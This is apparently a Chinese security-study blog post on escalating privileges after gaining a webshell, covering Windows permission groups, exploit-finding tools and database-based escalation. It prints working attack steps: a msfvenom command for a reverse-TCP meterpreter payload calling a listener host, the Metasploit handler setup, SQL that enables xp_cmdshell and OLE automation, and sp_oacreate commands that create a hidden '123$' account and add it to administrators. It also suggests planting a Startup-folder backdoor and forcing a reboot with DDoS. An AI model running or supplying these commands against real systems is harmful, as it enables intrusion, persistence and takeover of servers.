<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>权限提升|win|linux | Dralin's SweetNest</title><meta name="author" content="DralinF"><meta name="copyright" content="DralinF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="权限提升|通过后台获取webshell|大纲 具体分析1、对于一个网站，先找其是否使用了cms，使用了哪套cms，然后上网搜索如何拿shell；若是一些不知名的cms，我们可以下载下来，自己代码审计分析。2、如果前期通过sql注入、备份源码下载登上了其网站的后台，如何提权？先看图片的思路点。再看功能点。通过后台进行权限提升，从而拿shell。3、相关操作被拒绝无法实现的时候就会涉及权限提升。具体有">
<meta property="og:type" content="article">
<meta property="og:title" content="权限提升|win|linux">
<meta property="og:url" content="http://fzsecurity-github.github.io/2023/11/23/quanxiantisheng/index.html">
<meta property="og:site_name" content="Dralin&#39;s SweetNest">
<meta property="og:description" content="权限提升|通过后台获取webshell|大纲 具体分析1、对于一个网站，先找其是否使用了cms，使用了哪套cms，然后上网搜索如何拿shell；若是一些不知名的cms，我们可以下载下来，自己代码审计分析。2、如果前期通过sql注入、备份源码下载登上了其网站的后台，如何提权？先看图片的思路点。再看功能点。通过后台进行权限提升，从而拿shell。3、相关操作被拒绝无法实现的时候就会涉及权限提升。具体有">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg">
<meta property="article:published_time" content="2023-11-23T13:23:42.000Z">
<meta property="article:modified_time" content="2023-12-04T14:11:50.339Z">
<meta property="article:author" content="DralinF">
<meta property="article:tag" content="权限提升">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg"><link rel="shortcut icon" href="/img/sweetwo.png"><link rel="canonical" href="http://fzsecurity-github.github.io/2023/11/23/quanxiantisheng/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: DralinF","link":"链接: ","source":"来源: Dralin's SweetNest","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '权限提升|win|linux',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-12-04 22:11:50'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/myStyle.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dralin's SweetNest"><span class="site-name">Dralin's SweetNest</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">权限提升|win|linux</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-23T13:23:42.000Z" title="发表于 2023-11-23 21:23:42">2023-11-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-04T14:11:50.339Z" title="更新于 2023-12-04 22:11:50">2023-12-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="权限提升|win|linux"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="权限提升-通过后台获取webshell-大纲"><a href="#权限提升-通过后台获取webshell-大纲" class="headerlink" title="权限提升|通过后台获取webshell|大纲"></a>权限提升|通过后台获取webshell|大纲</h1><p><img src="https://pic.imgdb.cn/item/6560667bc458853aef5476b4.webp"></p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p>1、对于一个网站，先找其是否使用了cms，使用了哪套cms，然后上网搜索如何拿shell；若是一些不知名的cms，我们可以下载下来，自己代码审计分析。<br>2、如果前期通过sql注入、备份源码下载登上了其网站的后台，如何提权？先看图片的思路点。再看功能点。通过后台进行权限提升，从而拿shell。<br>3、相关操作被拒绝无法实现的时候就会涉及权限提升。<br><code>具体有哪些权限需要我们知道和了解掌握的?</code><br>后台权限，网站权限，数据库权限，接口权限，系统权限，域控权限等<br>（1）、后台权限: (获得方式:爆破，注入猜解，弱口令等获取的帐号营码配合登录)<br>一股网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。 (如后台功能存在文件操作的话也可以操作文件数据)<br>（2）、网站权限:(获得方式:以上图片三种思路获取)<br>查看或修改程序源代码，可以进行网站或应用的配置文件读取(接口配置信息，数据库配置信息等)，还能收集服务器操作系统相关的信息，为后续系统提权做准备,<br>（3）、数据库权限<br>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshe11)进行的据库配置文件读取获得。<br>（4）、接口权限:(邮件，短信，支付，第三方登录等)后台或网站权限后的获取途径:后台(修改配置信息功能点)，网站权限(查看的配置文件获取)，具体可以操作的事情自己想想</p>
<h1 id="对windows操作系统进行分析"><a href="#对windows操作系统进行分析" class="headerlink" title="对windows操作系统进行分析"></a>对windows操作系统进行分析</h1><h2 id="权限提升-win溢出漏洞-ps提权"><a href="#权限提升-win溢出漏洞-ps提权" class="headerlink" title="权限提升|win溢出漏洞|ps提权"></a>权限提升|win溢出漏洞|ps提权</h2><p><code>e部分来源</code>：<a target="_blank" rel="noopener" href="https://www.yuque.com/weiker/xiaodi/oeu0k6l93qydx738#tYHDV">https://www.yuque.com/weiker/xiaodi/oeu0k6l93qydx738#tYHDV</a> </p>
<h3 id="必备知识点"><a href="#必备知识点" class="headerlink" title="必备知识点"></a>必备知识点</h3><p>1、对于windows，明确权限提升环境问题：web及本地<br>根据web进行提权：对方的服务器搭建有网站，我根据其网站权限获取到其服务器的权限，难度较大，不易成功（网站的权限一般都比较低，有些东西不易操作）；<br>根据本地进行提取：我获取其服务器计算机上某个普通用户的权限，想进一步获取管理员权限，较易成功。<br><code>web提权：已有网站权限（可以操作网站内容，但无法操作服务器），想要获得服务器权限，进而操作服务器。</code><br><code>本地提权：已有服务器普通用户权限，想要获得root权限--内网渗透比较多。</code><br><code>明确权限提升方法针对：针对方法适应问题</code><br>2、明确权限提升针对版本：个人（win7&#x2F;8&#x2F;9）及服务器版本（windows2012&#x2F;2016&#x2F;win xp）<br>3、权限认识|用户及用户组权限划分<br><code>0x00 windows权限认识(用户及用户组)</code><br>Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions）,它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这些用户账户也将具备该组所拥有的权限。<br><code>0x01 普通权限</code><br>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限，管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、备份操作组(Backup Operators)、文件复制组(Replicator)、来宾用户组(Guests)，身份验证用户组(Ahthenticated users)。其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。<br>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行涉及管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。<br><code>0x02特殊权限</code><br>除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分别是:SYSTEM(系统)–最高权限、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br>真正拥有“完全访问权”的只有一个成员:SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的账户，一般的操作是无法获取与它等价的权限的。<br>“所有人”权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员。<br>被标记为“创建者”权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br>但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br>无论是普通权限还是特殊权限，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组再加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。<br><code>所以，我们说的提权，最好是提到SYSTEM，次之就是管理员组(Administrators)内某个成员</code><br><code>假设脚本是jsp，那么提到的webshell权限默认是system；而其他py，asp则是webshell权限</code></p>
<h3 id="具体分析-1"><a href="#具体分析-1" class="headerlink" title="具体分析"></a>具体分析</h3><p>1、通过后门获取到对方网站权限后，我们如何利用缓冲区溢出提权？（p59-15：00）<br>答：信息收集-补丁筛选（也即是查找哪些漏洞可以使用。Vulmap（适用于linux、kali自带），Wes，WindowsVulnScan）-利用MSF或特定EXP-执行-西瓜到手<br>以上工具的原理好像是先通过systeminfo导出系统的信息，然后利用此信息去对比，从而发现漏洞。<br>Vulmap，Wes，WindowsVulnScan三种方法对比：<br>vulmap: 缺点需要在powershell环境中执行，而对于webshell中是没有权限的，更适配Linux系统。我在物理机和虚拟机中都要运行都出现了各种各样的问题。<br>wes：优点能适应web环境只需要在webshell中执行cmd命令将信息导出到本地环境中执行即可<br>WindowsVulnScan：缺点：需要借助powershll也可以用systeminfo获取的信息安装工具的格式改成为json<br>2、利用MSF或特定EXP提权<br>利用上述3种方法之一找出可利用的漏洞之后，我们可以利用msf或者特定exp进行测试。<br>首选msf工具，但是msf工具是隔一段时间更新一版，因此msf中的漏洞可能更新不及时，如果遇到了msf没有收录的漏洞，我们可以网上搜索特定的exp测试，比如GitHub上有人整理了很多exp，可以搜索一下。<br><code>在实战中，由于攻击的服务器在外网，如果使用msf的话，会反弹一个shell，如果不在外网会收不到，所以建议整一台linux服务器，上面只装一个msf即可</code><br>MSF结合云服务器搭建组合拳？模拟上述操作实战演练？在实际环境中比较鸡肋因为涉及到阿里云的安全组端口开放问题<br>● 若要在实战中使用msf，最好买台服务器，不需要配置太好，2核4G即可，linux操作系统（Ubuntu更兼容），只安装msf，使用时用xshell连接即可。<br>● 云服务器上安装MSF环境：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/M0rta1s/p/11920903.html">https://www.cnblogs.com/M0rta1s/p/11920903.html</a><br>3、<code>总结</code><br>（1）.提权方法有部分适用在不同环境，当然也有通用方法（觉得关键语句是systeminfo，根据所处的环境选取漏洞筛选工具，筛选出漏洞后，利用上述所说的方法进行漏洞的利用）<br>（2）.提权方法也有操作系统版本区别，特性决定方法利用面（某些操作系统的版本可以直接上网搜索cve-exp，在本地运行即可直接获取system权限–前提：拥有一个普通用户的权限）<br>（3）.提权方法有部分需要特定环境，如数据库，第三方提权等（利用某些操作系统版本涉及的bug进行提权）</p>
<h2 id="权限提升-数据库权限提升-令牌窃取"><a href="#权限提升-数据库权限提升-令牌窃取" class="headerlink" title="权限提升|数据库权限提升|令牌窃取"></a>权限提升|数据库权限提升|令牌窃取</h2><p><code>关系数据库以及非关系数据库区别：</code><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51392112/article/details/131353186">https://blog.csdn.net/qq_51392112/article/details/131353186</a></p>
<h3 id="数据库提权-大纲"><a href="#数据库提权-大纲" class="headerlink" title="数据库提权|大纲"></a>数据库提权|大纲</h3><p><img src="https://pic.imgdb.cn/item/6563554bc458853aef9264c6.webp"><br><code>前言：</code><br>1、Web提权(webshell权限通过数据库提权提升至服务器权限)本地提权皆可，核心是得到数据库的账号密码<br>2、在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权。<br>3、数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码<br>4、除Access数据库外，其他数据库基本都存在数据库提权的可能<br><code>流程：</code>服务探针-信息收集-提权利用-获取权限</p>
<h3 id="数据库提权-具体分析"><a href="#数据库提权-具体分析" class="headerlink" title="数据库提权|具体分析"></a>数据库提权|具体分析</h3><p><code>数据库应用提权在权限提升中的意义</code><br>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权<br><code>WEB或本地环境如何探针数据库应用</code><br>通过探针判断有数据库相关的服务<br>通过端口扫描看是否开启对应端口<br>通过命令段看是否开启相关服务<br>通过浏览文件或文件夹判定是否安装相关数据库<br><code>数据库提权权限用户密码收集等方法</code><br>配置文件、储存文件、暴力拆解、其他方式<br>配置文件：一些需要调用数据库的程序会有配置文件记录账号密码<br>储存文件：将数据库中的一些储存文件下载还原，解析里面的账号密码<br>暴力拆解：通过爆破脚本等爆破密码<br>一般是前两种，第一种最常见。从相关的配置文件中获得账号密码<br><code>目前数据库提权对应的技术及方法等</code><br>要进行分类，根据数据库的不同使用不同的方法</p>
<h4 id="对于mysql的数据库提权分析"><a href="#对于mysql的数据库提权分析" class="headerlink" title="对于mysql的数据库提权分析"></a>对于mysql的数据库提权分析</h4><p><code>1、服务探针</code><br>连接webshell，对目标服务器进行端口扫描，发现开放了3306端口，说明服务器部署了MySQL数据库。<br><code>2、信息收集</code><br>MySQL的最高权限的用户名为root，尝试获取root的密码。<br><code>方法1：读取网站数据库配置文件</code><br>这种方法的关键是了解其命名规则及查找技巧。可以重点查看带有关键字的配置文件，常见的关键字有sql、data、inc、config、conn、database、common、include等。<br><code>方法2：读取数据库存储或备份文件</code><br>首先，我们了解一下MySQL数据库存储格式及对应内容。<br>@@basedir&#x2F;data&#x2F;数据库名&#x2F;表名.myd，表名.myd文件中的内容对应的就是表的内容<br>相应地，mysql.user对应的内容就存储在MySQLr&#x2F;data&#x2F;mysql&#x2F;user.myd文件中<br><code>方法3：利用脚本暴力猜解</code><br>获取数据库最高权限密码，一般我们使用前两种方法居多，如果前两种方法实在用不了，我们才考虑使用暴力猜解。暴力猜解之前，需要先了解数据库是否支持外联以及如何开启外联(不支持外联就是只支持服务端本机连接)。<br>● 若数据库支持外联，可以远程本地暴力猜解；<br>● 若数据库不支持外联，可以服务器本地暴力猜解。<code>你不是已经获取到webshell权限了吗，那么就可以上传这个脚本文件，在服务器本地进行爆破（需要考虑本地脚本环境），PHP搭建的，就上传一个PHP爆破的脚本，再本地访问即可</code><br>但是，其实root账户一般是不支持外联的，所以没法使用工具进行本地暴力猜解，但是我们可以将脚本通过webshell上传到服务器，在服务器本地使用脚本暴力猜解。脚本可以从网上自行下载。<br><code>3、提权利用</code><br>法一：UDF提权，前提得知道数据库版本，核心是.dll文件（获取mysql控制权限：知道mysql用户名和密码，并且可以远程登录（即获取了mysql数据库的权限）<br>mysql具有写入文件的权限：mysql有写入文件的权限，即secure_file_priv的值为空。）。<br>法二：MOF法，不推荐。<br>法三：启动项提权。启动项提权,查看有哪些开机自动执行的脚本程序，把后门脚本添加到自启动。<br>C:\Users\admin(windows用户名)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br>可以利用msf，上传一个后门到上述路径处，然后若对面重启，那就会自动运行我们这个后门，那么就可以实现提权。<br>备注：问题是如何让我服务器重启，在一般的情况下服务器是不会轻易的重启的，要想重启就是做一些恶意的操作，ddos攻击和恶意脚本攻击。<br>法四：nc反弹shell<br>生成木马</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令行执行：msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">lhost</span>=192.168.21.39 <span class="attribute">lport</span>=8888 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在msf开启的命令(好像是)</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 0.0.0.0</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport</span> 想要在哪个端口监听</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>nc相关知识：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11748488.html">https://www.cnblogs.com/-chenxs/p/11748488.html</a></p>
<h4 id="对mssql的数据库提权分析"><a href="#对mssql的数据库提权分析" class="headerlink" title="对mssql的数据库提权分析"></a>对mssql的数据库提权分析</h4><p><code>1、使用xp_cmdshell进行提权</code><br>&lt;1&gt;通过查看服务器配置文件得到sa账户密码为admin。<br>&lt;2&gt;由于mssql默认支持外联，因为可以本地通过SqlServer2008客户端使用sa账户密码连接。Navicat也能连接，但是推荐用官方的。<br>&lt;3&gt;启用xp_cmdshell。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。</p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span><span class="comment">;</span></span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span><span class="comment">;</span></span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>&lt;4&gt;接下来，我们就可以执行任意命令了。<br>EXEC master.dbo.xp_cmdshell ‘命令’;<br>&lt;5&gt;如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复<br>exex master.sys.sp_addextendedproc ‘xp_cmdshell’,’C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’<br><code>xp_cmdshell在数据库-系统数据库-master-可编程性-扩展存储过程-系统扩展存储过程目录下。</code><br>总的来说就是通过前期获得的mssql数据库密码，通过软件进行连接，利用mssql自带的xp_cmdshell表执行命令，即可实现提权。<br><code>2、使用sp_oacreate进行提权</code><br>主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。<br>&lt;1&gt;启用sp_oacreate</p>
<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">启用：</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> <span class="keyword">OVERRIDE</span>;</span><br><span class="line">EXEC sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> <span class="keyword">OVERRIDE</span>;</span><br></pre></td></tr></table></figure>
<p>&lt;2&gt;执行命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">执行whoami查看权限：</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output <span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c whoami &gt;C:\\1.txt&#x27;</span></span><br><span class="line"> </span><br><span class="line">添加用户：</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output <span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net user 123$ 123/add&#x27;</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span> <span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,<span class="variable">@shell</span> output <span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>,<span class="string">&#x27;run&#x27;</span>,<span class="keyword">null</span>,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 123$ /add&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>3、使用SqlServer沙盒提权</code><br>当前面两种都不得行，最终方案。<br>这个就是利用sql server上的沙盒模式。<br>具体看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/st3pby/article/details/128492244">https://blog.csdn.net/st3pby/article/details/128492244</a><br>照着操作就完事了<br>对于以上三种提权方式，我个人认为是你得现有一个普通用户权限，即本地提权。</p>
